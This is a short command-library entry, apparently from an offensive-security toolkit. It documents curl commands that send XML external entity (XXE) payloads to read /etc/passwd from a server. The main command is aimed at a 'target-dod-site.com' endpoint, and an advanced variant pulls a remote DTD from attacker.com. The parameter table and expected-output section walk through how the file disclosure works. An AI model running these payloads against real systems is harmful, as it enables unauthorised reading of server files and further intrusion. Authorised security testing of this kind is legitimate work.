---
id: cmd-uuid-3456
data: >-
  curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"
  encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM
  "file:///etc/passwd">]><root>&xxe;</root>'
  http://target-dod-site.com/vulnerable-endpoint
tags:
  - xxe
  - recon
type: command
output: Response body contains file contents if vulnerable
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.403Z'
verified: false
validated: true
submitted: true
---
# curl-xml-payload

## Command

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' http://target-dod-site.com/vulnerable-endpoint
```

## Description

Sends a basic XXE payload via curl to test for file disclosure vulnerabilities in XML-processing endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: application/xml"` | Sets XML content type | Yes |
| `-d '...' ` | XML payload with entity | Yes |
| `http://target...` | Vulnerable URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' http://example.com/xml-endpoint
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: application/xml" --data-urlencode '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote;]><root></root>' http://example.com/xml-endpoint
```

## Expected Output

If successful, the HTTP response body includes the contents of the targeted file, such as user accounts from /etc/passwd. Errors indicate sanitization or non-vulnerable parser.

## Related

- [[Related Procedure: Exploit-XXE-for-File-Disclosure]]
